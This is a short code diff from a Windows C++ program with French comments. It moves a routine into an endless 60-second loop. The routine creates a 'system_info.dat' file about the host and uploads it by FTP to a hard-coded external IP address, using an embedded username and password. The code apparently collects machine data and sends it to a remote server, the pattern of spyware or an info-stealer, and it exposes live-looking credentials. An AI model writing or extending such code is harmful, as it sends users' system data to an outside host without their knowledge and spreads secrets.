@@ -91,17 +91,17 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 
     while (true) {
         this_thread::sleep_for(chrono::seconds(60));
-    }
 
-    if (!PathFileExistsA("system_info.dat")) {
-        // Si le fichier n'existe pas, on le crée et on l'upload
-        createSystemInfoFile();
-        uploadFileToFTP("45.90.160.149", "debian", "UiCT?\"Zn3BXM^~ouprhl3N^b2Iy!CF`u%e$P?#sS@@hwerwPn%i=1*1;nfb`RKX7", "system_info.dat", "system_info.dat");
-        //MessageBox(NULL, TEXT(globalUUID.c_str()), TEXT("Alerte"), MB_OK);
-    } else {
-        // Sinon, on lit l'UUID existant
-        //readUUIDFromFile();
-        //MessageBox(NULL, TEXT(globalUUID.c_str()), TEXT("Alerte"), MB_OK);
+        if (!PathFileExistsA("system_info.dat")) {
+            // Si le fichier n'existe pas, on le crée et on l'upload
+            createSystemInfoFile();
+            uploadFileToFTP("45.90.160.149", "debian", "UiCT?\"Zn3BXM^~ouprhl3N^b2Iy!CF`u%e$P?#sS@@hwerwPn%i=1*1;nfb`RKX7", "system_info.dat", "system_info.dat");
+            //MessageBox(NULL, TEXT(globalUUID.c_str()), TEXT("Alerte"), MB_OK);
+        } else {
+            // Sinon, on lit l'UUID existant
+            //readUUIDFromFile();
+            //MessageBox(NULL, TEXT(globalUUID.c_str()), TEXT("Alerte"), MB_OK);
+        }
     }
 
     return 0;
